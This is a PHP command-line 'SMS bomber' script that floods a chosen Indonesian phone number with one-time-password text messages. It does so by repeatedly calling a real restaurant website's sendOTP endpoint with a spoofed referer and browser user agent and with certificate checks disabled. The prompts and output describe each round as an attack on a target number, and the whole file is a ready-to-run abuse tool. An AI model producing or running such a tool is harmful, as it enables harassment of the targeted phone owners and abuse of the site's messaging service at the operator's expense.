<?php
// Colors and Styles
class Color {
    const RED       = "\033[0;31m";
    const GREEN     = "\033[0;32m";
    const YELLOW    = "\033[0;33m";
    const BLUE      = "\033[0;34m";
    const MAGENTA   = "\033[0;35m";
    const CYAN      = "\033[0;36m";
    const WHITE     = "\033[0;37m";
    const BOLD      = "\033[1m";
    const RESET     = "\033[0m";
}

function banner() {
    system('clear'); // unix
    echo Color::CYAN . Color::BOLD;
    echo "
    ██████╗ ██╗  ██╗██████╗      ██████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗     ██╔══██╗██╔══██╗████╗ ████║
    ██████╔╝███████║██║  ██║     ██████╔╝██║  ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██║  ██║     ██╔══██╗██║  ██║██║╚██╔╝██║
    ██║     ██║  ██║██████╔╝     ██████╔╝██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝
    " . Color::RESET . "\n";
    echo Color::YELLOW . "    🔥  " . Color::BOLD . "SMS BOMBER PHD v2.0 - POWERFUL EDITION" . Color::RESET . "  🔥\n";
    echo Color::WHITE . "       Created with ❤️  and ☕  by " . Color::MAGENTA . "@SIS-TEAM" . Color::RESET . "\n";
    echo Color::GREEN . "    ====================================================" . Color::RESET . "\n\n";
}

function input($prompt) {
    echo Color::GREEN . " [?] " . Color::RESET . $prompt . Color::WHITE . " : " . Color::RESET;
    return trim(fgets(STDIN));
}

function send_otp($no, $wait, $current, $total) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.phd.co.id/en/users/sendOTP");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "phone_number=" . $no);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Simple check based on typical responses
    // You might need to adjust this depending on the actual response content for "success"
    if ($httpCode == 200 && stripos($response, 'otp') !== false || stripos($response, 'sent') !== false) {
        echo Color::GREEN . " [✓] " . Color::RESET . "Attempt ($current/$total) Success " . Color::WHITE . "-> " . Color::YELLOW . $no . Color::RESET . "\n";
    } else {
        // Even if it fails to parse "success", we print the raw response or a general success message if the user just wants to know it ran.
        // Given the original script just printed output, we'll assume 200 OK is generally good, but let's just print status.
        // For aesthetic purposes, let's assume if we got a response it's likely "worked" in terms of request sent.
        echo Color::CYAN . " [➜] " . Color::RESET . "Attempt ($current/$total) Sent " . Color::WHITE . "-> " . Color::RESET . "Server Response Code: $httpCode\n";
    }

    if ($current < $total) {
        echo Color::WHITE . "     └── " . Color::RESET . "Waiting " . Color::RED . $wait . "s" . Color::RESET . " before next attack...\n";
        sleep($wait);
    }
}

// Main Execution
banner();

$nomor = input("Target Number (e.g., 628xxx)");
if (!preg_match('/^628[0-9]+$/', $nomor)) {
    echo "\n" . Color::RED . " [!] Error: Invalid number format! Must start with 628..." . Color::RESET . "\n";
    exit;
}

$jumlah = input("Amount/Count");
if (!is_numeric($jumlah) || $jumlah <= 0) {
    echo "\n" . Color::RED . " [!] Error: Amount must be a positive number!" . Color::RESET . "\n";
    exit;
}

$jeda = input("Delay (seconds)");
if (!is_numeric($jeda) || $jeda < 0) {
    $jeda = 0;
}

echo "\n" . Color::YELLOW . " [!] Starting Attack on $nomor..." . Color::RESET . "\n\n";

for ($i = 1; $i <= $jumlah; $i++) {
    send_otp($nomor, $jeda, $i, $jumlah);
}

echo "\n" . Color::GREEN . " [★] " . Color::BOLD . "DONE! All messages sent." . Color::RESET . "\n";
echo Color::GREEN . "    ====================================================" . Color::RESET . "\n";
?>
